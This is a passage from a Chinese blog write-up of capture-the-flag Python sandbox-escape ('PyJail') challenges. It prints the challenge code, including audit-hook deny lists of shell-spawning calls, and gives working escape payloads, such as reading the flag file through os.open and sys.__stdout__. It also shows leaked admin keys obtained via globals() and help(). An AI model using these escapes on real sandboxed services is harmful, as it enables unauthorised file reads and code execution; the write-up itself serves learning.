<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">#it seems have a backdoor</span><br><span class="line">#can u find the key of it and use the backdoor</span><br><span class="line"></span><br><span class="line">fake_key_var_in_the_local_but_real_in_the_remote = &quot;[DELETED]&quot;</span><br><span class="line"></span><br><span class="line">def func():</span><br><span class="line">    code = input(&quot;&gt;&quot;)</span><br><span class="line">    if(len(code)&gt;9):</span><br><span class="line">        return print(&quot;you&#x27;re hacker!&quot;)</span><br><span class="line">    try:</span><br><span class="line">        print(eval(code))</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">def backdoor():</span><br><span class="line">    print(&quot;Please enter the admin key&quot;)</span><br><span class="line">    key = input(&quot;&gt;&quot;)</span><br><span class="line">    if(key == fake_key_var_in_the_local_but_real_in_the_remote):</span><br><span class="line">        code = input(&quot;&gt;&quot;)</span><br><span class="line">        try:</span><br><span class="line">            print(eval(code))</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;Nooo!!!!&quot;)</span><br><span class="line"></span><br><span class="line">WELCOME = &#x27;&#x27;&#x27;</span><br><span class="line">  _       _          _       _          _       _        </span><br><span class="line"> | |     | |        | |     | |        | |     | |       </span><br><span class="line"> | | __ _| | _____  | | __ _| | _____  | | __ _| | _____ </span><br><span class="line"> | |/ _` | |/ / _ \ | |/ _` | |/ / _ \ | |/ _` | |/ / _ \</span><br><span class="line"> | | (_| |   &lt;  __/ | | (_| |   &lt;  __/ | | (_| |   &lt;  __/</span><br><span class="line"> |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|                                                                                                                                                                     </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">print(WELCOME)</span><br><span class="line"></span><br><span class="line">print(&quot;Now the program has two functions&quot;)</span><br><span class="line">print(&quot;can you use dockerdoor&quot;)</span><br><span class="line">print(&quot;1.func&quot;)</span><br><span class="line">print(&quot;2.backdoor&quot;)</span><br><span class="line">input_data = input(&quot;&gt; &quot;)</span><br><span class="line">if(input_data == &quot;1&quot;):</span><br><span class="line">    func()</span><br><span class="line">    exit(0)</span><br><span class="line">elif(input_data == &quot;2&quot;):</span><br><span class="line">    backdoor()</span><br><span class="line">    exit(0)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;not found the choice&quot;)</span><br><span class="line">    exit(0)</span><br></pre></td></tr></table></figure>

<p>OK我们来浅浅的分析一下func和backdoor</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271533813.png?raw=true" alt="image-20240607210544690"></p>
<p>func：对输入的payload进行长度检验，若大于9则拦截</p>
<p>backdoor:先对key进行检验，这里有个假key和真key，真的在服务器上，这里没有对输入的payload进行长度限制，猜想出题人是想让我们在这利用</p>
<p>不过也确实，仔细一想的话好像还真不能用肾么9个字以内的payload达到rce掉python</p>
<p>于是globals()，刚好九个字符，查找全局变量</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271533377.png?raw=true" alt="image-20240607210851288"></p>
<p>这key不就出来了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a34af94e88aed5c34fb5ccfe08cd14ab</span><br></pre></td></tr></table></figure>

<p>哎呀看那个知乎的WP写的真是神人，用什么密码学的方式写，我这种菜的用密码怕不是要爆零</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271533380.png?raw=true" alt="image-20240607212213071"></p>
<p>也是拿下了</p>
<h4 id="l-ke-l-ke-l-ke"><a href="#l-ke-l-ke-l-ke" class="headerlink" title="l@ke l@ke l@ke"></a>l@ke l@ke l@ke</h4><p>这题跟上一题差不多呢</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271533464.png?raw=true" alt="image-20240607212520969"></p>
<p>func的限制长度变成了6罢了</p>
<p>我自己仔细一琢磨，help()不是刚好六个字？</p>
<p>瞧我这聪明劲</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271533920.png?raw=true" alt="image-20240607212721708"></p>
<p>哎呀好吧还是有点蠢的，怎么跑去看人家模块去了哈哈哈</p>
<p>看server</p>
<p>![e6721a5e2f36a56e4a2cafed49808af](C:\Users\林郑果\Documents\WeChat Files\wxid_ong0ayoiddjn22\FileStorage\Temp\e6721a5e2f36a56e4a2cafed49808af.png)</p>
<p>那么好了好了，key拿到哩</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">95c720690c2c83f0982ffba63ff87338</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271533712.png?raw=true" alt="image-20240607213133709"></p>
<p>我吃！</p>
<h4 id="laKe-laKe-laKe"><a href="#laKe-laKe-laKe" class="headerlink" title="laKe laKe laKe"></a>laKe laKe laKe</h4><p>题目给了源码附件，审代码吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">#You finsih these two challenge of leak</span><br><span class="line">#So cool</span><br><span class="line">#Now it&#x27;s time for laKe!!!!</span><br><span class="line"></span><br><span class="line">import random</span><br><span class="line">from io import StringIO</span><br><span class="line">import sys</span><br><span class="line">sys.addaudithook</span><br><span class="line"></span><br><span class="line">BLACKED_LIST = [&#x27;compile&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;open&#x27;]</span><br><span class="line"></span><br><span class="line">eval_func = eval</span><br><span class="line">open_func = open</span><br><span class="line"></span><br><span class="line">for m in BLACKED_LIST:</span><br><span class="line">    del __builtins__.__dict__[m]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def my_audit_hook(event, _):</span><br><span class="line">    BALCKED_EVENTS = set(&#123;&#x27;pty.spawn&#x27;, &#x27;os.system&#x27;, &#x27;os.exec&#x27;, &#x27;os.posix_spawn&#x27;,&#x27;os.spawn&#x27;,&#x27;subprocess.Popen&#x27;&#125;)</span><br><span class="line">    if event in BALCKED_EVENTS:</span><br><span class="line">        raise RuntimeError(&#x27;Operation banned: &#123;&#125;&#x27;.format(event))</span><br><span class="line"></span><br><span class="line">def guesser():</span><br><span class="line">    game_score = 0</span><br><span class="line">    sys.stdout.write(&#x27;Can u guess the number? between 1 and 9999999999999 &gt; &#x27;)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    right_guesser_question_answer = random.randint(1, 9999999999999)</span><br><span class="line">    sys.stdout, sys.stderr, challenge_original_stdout = StringIO(), StringIO(), sys.stdout</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        input_data = eval_func(input(&#x27;&#x27;),&#123;&#125;,&#123;&#125;)</span><br><span class="line">    except Exception:</span><br><span class="line">        sys.stdout = challenge_original_stdout</span><br><span class="line">        print(&quot;Seems not right! please guess it!&quot;)</span><br><span class="line">        return game_score</span><br><span class="line">    sys.stdout = challenge_original_stdout</span><br><span class="line"></span><br><span class="line">    if input_data == right_guesser_question_answer:</span><br><span class="line">        game_score += 1</span><br><span class="line">    </span><br><span class="line">    return game_score</span><br><span class="line"></span><br><span class="line">WELCOME=&#x27;&#x27;&#x27;</span><br><span class="line">  _       _  __      _       _  __      _       _  __    </span><br><span class="line"> | |     | |/ /     | |     | |/ /     | |     | |/ /    </span><br><span class="line"> | | __ _| &#x27; / ___  | | __ _| &#x27; / ___  | | __ _| &#x27; / ___ </span><br><span class="line"> | |/ _` |  &lt; / _ \ | |/ _` |  &lt; / _ \ | |/ _` |  &lt; / _ \</span><br><span class="line"> | | (_| | . \  __/ | | (_| | . \  __/ | | (_| | . \  __/</span><br><span class="line"> |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|</span><br><span class="line">                                                         </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(WELCOME)</span><br><span class="line">    print(&#x27;Welcome to my guesser game!&#x27;)</span><br><span class="line">    game_score = guesser()</span><br><span class="line">    if game_score == 1:</span><br><span class="line">        print(&#x27;you are really super guesser!!!!&#x27;)</span><br><span class="line">        print(open_func(&#x27;flag&#x27;).read())</span><br><span class="line">    else:</span><br><span class="line">        print(&#x27;Guess game end!!!&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    sys.addaudithook(my_audit_hook)</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ban了os模块很多东西，subprocess也ban了</p>
<p>说是有非预期，因为没ban掉open</p>
<p>guesser部分函数分析一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">def guesser():</span><br><span class="line">    game_score = 0</span><br><span class="line">    sys.stdout.write(&#x27;Can u guess the number? between 1 and 9999999999999 &gt; &#x27;)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    right_guesser_question_answer = random.randint(1, 9999999999999)</span><br><span class="line">    sys.stdout, sys.stderr, challenge_original_stdout = StringIO(), StringIO(), sys.stdout</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        input_data = eval_func(input(&#x27;&#x27;),&#123;&#125;,&#123;&#125;)</span><br><span class="line">    except Exception:</span><br><span class="line">        sys.stdout = challenge_original_stdout</span><br><span class="line">        print(&quot;Seems not right! please guess it!&quot;)</span><br><span class="line">        return game_score</span><br><span class="line">    sys.stdout = challenge_original_stdout</span><br><span class="line"></span><br><span class="line">    if input_data == right_guesser_question_answer:</span><br><span class="line">        game_score += 1</span><br><span class="line">    </span><br><span class="line">    return game_score</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里可以关注到一个点就是，这里用了sys.stderr进行结果的重定向，</p>
<p><em># 将标准输出和错误输出重定向到StringIO对象，原始标准输出保存在challenge_original_stdout变量中</em></p>
<p>引入的这个sys模块本身存在一定的问题，虽然是为了保证audit hoook能够发挥预期作用，但在这里的实际应用上并没有ban掉我们的读写操作</p>
<p>payload雏形</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__import__(&quot;sys&quot;).__stdout__.write()</span><br><span class="line">#动态导入sys模块，并且从中获得stdout属性，stdout中个属性是一个文件类对象，代表标准输出流，然后用stdout当中的write方法将目标数据写入</span><br></pre></td></tr></table></figure>

<p>在这个payload的基础上，我们write方法就应该写入flag，这样flag就能被写到stdout当中，被我们读到</p>
<p>用os.open打开文件，用os.read读文件，或者__import__(‘io’).open(“flag”).read()</p>
<p>完整payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&quot;sys&quot;).__stdout__.write(__import__(&quot;os&quot;).read(__import__(&quot;os&quot;).open(&quot;flag&quot;,__import__(&quot;os&quot;).O_RDONLY), 0x114).decode())</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271533668.png?raw=true" alt="image-20240612155112996"></p>
<p>本来是输出一段判断结果的语句，但是我们把flag添加到了输出内容当中，于是就给我们输出了flag</p>
<p>但是看人家密码佬的wp说是要用什么梅森旋转法进行攻击，哎呀看不懂一点</p>
<p>[<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/579057932">PyJail] python沙箱逃逸探究·中（HNCTF题解 - WEEK2） - 知乎 (zhihu.com)</a></p>
<h4 id="lak3-lak3-lak3"><a href="#lak3-lak3-lak3" class="headerlink" title="lak3 lak3 lak3"></a>lak3 lak3 lak3</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">#Hi hackers,lak3 comes back</span><br><span class="line">#Have a good luck on it! :Wink:</span><br><span class="line"></span><br><span class="line">import random</span><br><span class="line">from io import StringIO</span><br><span class="line">import sys</span><br><span class="line">sys.addaudithook</span><br><span class="line"></span><br><span class="line">BLACKED_LIST = [&#x27;compile&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;]</span><br><span class="line"></span><br><span class="line">eval_func = eval</span><br><span class="line">open_func = open</span><br><span class="line"></span><br><span class="line">for m in BLACKED_LIST:</span><br><span class="line">    del __builtins__.__dict__[m]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def my_audit_hook(event, _):</span><br><span class="line">    BALCKED_EVENTS = set(&#123;&#x27;pty.spawn&#x27;, &#x27;os.system&#x27;, &#x27;os.exec&#x27;, &#x27;os.posix_spawn&#x27;,&#x27;os.spawn&#x27;,&#x27;subprocess.Popen&#x27;,&#x27;code.__new__&#x27;,&#x27;function.__new__&#x27;,&#x27;cpython._PySys_ClearAuditHooks&#x27;,&#x27;open&#x27;&#125;)</span><br><span class="line">    if event in BALCKED_EVENTS:</span><br><span class="line">        raise RuntimeError(&#x27;Operation banned: &#123;&#125;&#x27;.format(event))</span><br><span class="line"></span><br><span class="line">def guesser():</span><br><span class="line">    game_score = 0</span><br><span class="line">    sys.stdout.write(&#x27;Can u guess the number? between 1 and 9999999999999 &gt; &#x27;)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    right_guesser_question_answer = random.randint(1, 9999999999999)</span><br><span class="line">    sys.stdout, sys.stderr, challenge_original_stdout = StringIO(), StringIO(), sys.stdout</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        input_data = eval_func(input(&#x27;&#x27;),&#123;&#125;,&#123;&#125;)</span><br><span class="line">    except Exception:</span><br><span class="line">        sys.stdout = challenge_original_stdout</span><br><span class="line">        print(&quot;Seems not right! please guess it!&quot;)</span><br><span class="line">        return game_score</span><br><span class="line">    sys.stdout = challenge_original_stdout</span><br><span class="line"></span><br><span class="line">    if input_data == right_guesser_question_answer:</span><br><span class="line">        game_score += 1</span><br><span class="line">    </span><br><span class="line">    return game_score</span><br><span class="line"></span><br><span class="line">WELCOME=&#x27;&#x27;&#x27;</span><br><span class="line">  _       _    ____    _       _    ____    _       _    ____  </span><br><span class="line"> | |     | |  |___ \  | |     | |  |___ \  | |     | |  |___ \ </span><br><span class="line"> | | __ _| | __ __) | | | __ _| | __ __) | | | __ _| | __ __) |</span><br><span class="line"> | |/ _` | |/ /|__ &lt;  | |/ _` | |/ /|__ &lt;  | |/ _` | |/ /|__ &lt; </span><br><span class="line"> | | (_| |   &lt; ___) | | | (_| |   &lt; ___) | | | (_| |   &lt; ___) |</span><br><span class="line"> |_|\__,_|_|\_\____/  |_|\__,_|_|\_\____/  |_|\__,_|_|\_\____/ </span><br><span class="line">                                                                                                                                                                       </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(WELCOME)</span><br><span class="line">    print(&#x27;Welcome to my guesser game!&#x27;)</span><br><span class="line">    game_score = guesser()</span><br><span class="line">    if game_score == 1:</span><br><span class="line">        print(&#x27;you are really super guesser!!!!&#x27;)</span><br><span class="line">        print(&#x27;flag&#123;fake_flag_in_local_but_really_in_The_remote&#125;&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        print(&#x27;Guess game end!!!&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    sys.addaudithook(my_audit_hook)</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">deCOLE</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/03/18/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">http://example.com/2025/03/18/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">deCOLE's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">漏洞学习</a></div><div class="post-share"><div class="social-share" data-image="/img/touxiang.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/03/18/Pearcmd%E6%80%BB%E7%BB%93%E5%8F%8A%E5%88%A9%E7%94%A8/" title="Pearcmd总结及利用"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Pearcmd总结及利用</div></div><div class="info-2"><div class="info-item-1">Pearcmd总结及利用pearcmd简介​	pecl是PHP的一个命令行工具，用以管理扩展 ​	pear是pecl依赖的类库，在7.3及以前的PHP版本,pecl&#x2F;pear是默认安装的，而在7.4及之后的版本，则需要我们在编译PHP的时候，指定–with-pear选项，才会给我们安装 ​	但是，在Docker任意版本镜像当中，pcel&#x2F;pear都会被默认安装，并且安装的路径在&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php ​	在php.ini中，register_argc_argv&#x3D;On 需要被开启 漏洞原理​	在peracmd.php中，有一个关键字argv，是用来传递命令行参数的，并且使用了readPHPArgv()这个函数 1234567891011PEAR_Command::setFrontendType(&#x27;CLI&#x27;);$all_commands = PEAR_Command::getCommands();$argv = Console_Getopt::readPHPArgv();//...</div></div></div></a><a class="pagination-related" href="/2025/03/18/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="Python原型链污染"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Python原型链污染</div></div><div class="info-2"><div class="info-item-1">Python原型链污染​	前段时间学了Js的原型链污染，加上国赛和DAS都出了Sanic框架下的Python原型链污染的题，感觉之后还会碰上这样的题目，所以学习一下 一些简介​	原型： ​	每个对象拥有一个原型对象(prototype)，对象以该原型为模板，从原型继承方法和属性 原型链： ​	原型对象可能拥有原型，从中继承方法和属性，一层一层、以此类推，这样的关系结构叫做原型链 prototype和____proto...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/03/18/Pearcmd%E6%80%BB%E7%BB%93%E5%8F%8A%E5%88%A9%E7%94%A8/" title="Pearcmd总结及利用"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-18</div><div class="info-item-2">Pearcmd总结及利用</div></div><div class="info-2"><div class="info-item-1">Pearcmd总结及利用pearcmd简介​	pecl是PHP的一个命令行工具，用以管理扩展 ​	pear是pecl依赖的类库，在7.3及以前的PHP版本,pecl&#x2F;pear是默认安装的，而在7.4及之后的版本，则需要我们在编译PHP的时候，指定–with-pear选项，才会给我们安装 ​	但是，在Docker任意版本镜像当中，pcel&#x2F;pear都会被默认安装，并且安装的路径在&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php ​	在php.ini中，register_argc_argv&#x3D;On 需要被开启 漏洞原理​	在peracmd.php中，有一个关键字argv，是用来传递命令行参数的，并且使用了readPHPArgv()这个函数 1234567891011PEAR_Command::setFrontendType(&#x27;CLI&#x27;);$all_commands = PEAR_Command::getCommands();$argv = Console_Getopt::readPHPArgv();//...</div></div></div></a><a class="pagination-related" href="/2025/03/18/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="Python原型链污染"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-18</div><div class="info-item-2">Python原型链污染</div></div><div class="info-2"><div class="info-item-1">Python原型链污染​	前段时间学了Js的原型链污染，加上国赛和DAS都出了Sanic框架下的Python原型链污染的题，感觉之后还会碰上这样的题目，所以学习一下 一些简介​	原型： ​	每个对象拥有一个原型对象(prototype)，对象以该原型为模板，从原型继承方法和属性 原型链： ​	原型对象可能拥有原型，从中继承方法和属性，一层一层、以此类推，这样的关系结构叫做原型链 prototype和____proto...</div></div></div></a><a class="pagination-related" href="/2025/03/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" title="Redis未授权访问"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-18</div><div class="info-item-2">Redis未授权访问</div></div><div class="info-2"><div class="info-item-1">Redis未授权访问​	 什么是redis​	Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由Pivota赞助。 漏洞原理​	默认情况下呢，Redis是绑定在0.0.0.0:6379的，如果没设置密码(一般密码为空)或者密码为弱口令，缺乏有效保护措施的话，那么处于公网服务的redis服务就会被任意用户进行未授权访问，进行读取数据操作，甚至能利用redis自身的命令写入文件操作，这样就会产生进一步的攻击行为 漏洞复现根据bmjoker大佬的博客，整了俩虚拟机，一台攻击一台受害  先用src下的redis-cli对目标机进行连接，然后ping一下，发现能ping通 接着用keys...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/touxiang.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">deCOLE</div><div class="author-info-description">凡夫俗子岂识我，非到末路不甘休</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">So when you go</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-number">1.</span> <span class="toc-text">Python沙箱逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%E7%9A%84%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">一些前置知识的介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B2%99%E7%AE%B1"><span class="toc-number">1.1.1.</span> <span class="toc-text">沙箱</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python%E7%9A%84%E4%B8%80%E4%BA%9B%E7%89%B9%E6%80%A7"><span class="toc-number">1.1.2.</span> <span class="toc-text">Python的一些特性</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E7%8E%AF%E8%8A%82"><span class="toc-number">1.2.</span> <span class="toc-text">做题环节</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#calc-jail-beginner"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">calc_jail_beginner</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#calc-jail-beginner-level1"><span class="toc-number">1.2.0.2.</span> <span class="toc-text">calc_jail_beginner_level1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#calc-jail-beginner-level2"><span class="toc-number">1.2.0.3.</span> <span class="toc-text">calc_jail_beginner_level2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#calc-jail-beginner-level2-5"><span class="toc-number">1.2.0.4.</span> <span class="toc-text">calc_jail_beginner_level2.5</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#calc-jail-beginner-level3"><span class="toc-number">1.2.0.5.</span> <span class="toc-text">calc_jail_beginner_level3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#calc-jail-beginner-level4"><span class="toc-number">1.2.0.6.</span> <span class="toc-text">calc_jail_beginner_level4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 